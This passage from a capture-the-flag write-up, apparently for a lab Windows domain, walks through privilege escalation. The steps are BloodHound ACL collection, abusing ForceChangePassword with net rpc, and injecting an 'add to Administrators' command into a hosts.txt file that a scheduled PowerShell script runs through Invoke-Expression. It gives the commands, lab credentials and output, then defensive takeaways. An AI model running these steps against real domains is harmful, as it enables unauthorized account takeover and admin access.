### Privilege Escalation

### 4.1 Active Directory ACL Mapping with BloodHound

From the Kali attack machine, gather domain object relationships and Access Control Lists (ACLs) using `bloodhound-python`:

```bash
bloodhound-python -u buse -p 'uzunLM+3131' -d windcorp.thm -ns 10.10.190.110 -c all
```

Analyzing the generated JSON files in BloodHound reveals an exploitable permission edge:
- Account `buse` holds the **`ForceChangePassword`** extended right over user **`brittanycr`**.

### 4.2 Exploiting ForceChangePassword via RPC

> [!NOTE] Concept: ForceChangePassword Privilege Abuse
> The `ForceChangePassword` permission allows a principal to reset the target account's password without needing to know the current password and without generating account lockout violations.

Using the Samba RPC utility `net rpc password`, reset `brittanycr`'s domain password:

```bash
net rpc password "brittanycr" "Password123!" -U "WINDCORP"/"buse"%"uzunLM+3131" -S "fire.windcorp.thm"
```

### 4.3 Scheduled Task Script Injection

Accessing user shares with `brittanycr`'s new credentials:

```bash
smbclient //windcorp.thm/Users -U brittanycr
smb: \brittanycr\> ls
  hosts.txt                           A       24  Mon Apr 20 14:02:12 2020
smb: \brittanycr\> get hosts.txt
```

A scheduled PowerShell script running as an elevated account (`C:\scripts\checkservers.ps1`) iterates over the targets in `hosts.txt` using `Invoke-Expression`.

Because `hosts.txt` is evaluated by an administrative engine without input validation, appending a command line enables arbitrary command injection.

Modify `hosts.txt` to add `buse` into the local Administrators group:

```text
; net localgroup Administrators buse /add
```

Upload the modified `hosts.txt` back to the share:

```bash
smbclient //windcorp.thm/Users -U brittanycr -c "put hosts.txt"
```

Within a few minutes, the scheduled script executes, parses the injected command, and adds `buse` to the Administrators group.

Verify elevated group membership inside Evil-WinRM:

```powershell
*Evil-WinRM* PS C:\Users\buse\Documents> whoami /groups
```

```text
GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
BUILTIN\Administrators               Alias            S-1-5-32-544 Enabled by default, Enabled group, Group owner
```

Retrieve the root flag from the Administrator desktop:

## 5. Key Takeaways and Lessons Learned

1. **OSINT Verification:** Password recovery workflows often rely on predictable security questions. Inspecting metadata, image filenames, and social references on public web portals often bypasses administrative authentication.
2. **Active Directory ACL Exploitation:** In domain environments, lateral movement frequently hinges on misconfigured object permissions rather than software vulnerabilities. Running BloodHound to spot inbound and outbound object rights (`ForceChangePassword`, `GenericAll`, `WriteDacl`) is a required OSCP methodology step.
3. **Scheduled Task Argument Sanitization:** Scheduled maintenance scripts that read input lists from user-writable network locations must never pass contents directly to interpreters like `Invoke-Expression`.
